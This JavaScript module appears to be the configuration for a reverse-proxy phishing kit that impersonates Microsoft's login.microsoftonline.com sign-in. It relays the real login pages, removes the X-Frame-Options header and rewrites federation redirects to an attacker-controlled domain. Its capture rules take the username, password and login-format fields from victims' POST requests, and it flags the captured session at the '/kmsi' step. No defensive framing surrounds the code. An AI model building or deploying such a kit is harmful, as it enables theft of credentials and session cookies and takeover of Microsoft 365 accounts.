/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
             {
                reg: /window.__BssoInterrupt_/igm, // Google chrome on windows fix
                replacement: 'window.__BssoInterrupt_Core=!0;</script>'
                    + '</head> <body data-bind="defineGlobals: ServerData" style="display: none"> </body> </html>',
             },
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        if (this.proxyResp.headers['content-length'] < 1) {
            // {
            return this.proxyResp.pipe(this.browserEndPoint)
            // }
        }


        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
           const rLocation = extRedirectObj.url
            if (rLocation === 'https://www.office.com/landing') {
                this.concludeAuth()
            }
            if (rLocation.startsWith('https://login.microsoftonline.com/common/oauth2/authorize?client_id=')) {
                return this.proxyResp.pipe(this.browserEndPoint)
            }
        }

        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }

                if (this.proxyResp.headers['content-type'].startsWith('application/json')) {
                    const JObjBody = JSON.parse(newMsgBody)
                    if (JObjBody.hasOwnProperty('Credentials')) {
                        const fedUrl = JObjBody.Credentials.FederationRedirectUrl
                        if (fedUrl) {
                            const fedObj = new URL(fedUrl)
                            const newFedDomain = fedObj.hostname
                            console.log('fed domain is ' + newFedDomain)
                            this.browserEndPoint.clientSession.currentDomain = newFedDomain
                            newMsgBody = newMsgBody.replace(newFedDomain, process.env.HOST_DOMAIN)
                        }
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    concludeAuth() {
        console.log('Concluding path')

    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

        if (this.req.method === 'POST') {
            // super.uploadRequestBody(clientContext.currentDomain, clientContext)

            super.captureBody(clientContext.currentDomain, clientContext)

        }
        if (this.req.url === '/cold204') {
            this.res.writeHead(204)
            return this.res.end('')
        }


        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
            clientContext.currentDomain = process.env.PROXY_DOMAIN
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url === '/kmsi') {
            clientContext.setLogAvailable(true);
            super.sendClientData(clientContext, {})
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'login.microsoftonline.com',

    START_PATH: '/',
    EXTERNAL_FILTERS: 
        [
        'login.live.com',
        'aadcdn.msftauth.net',
        ],

    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['passwd'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },


        loginFmt: {
            method: 'POST',
            params: ['loginfmt'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

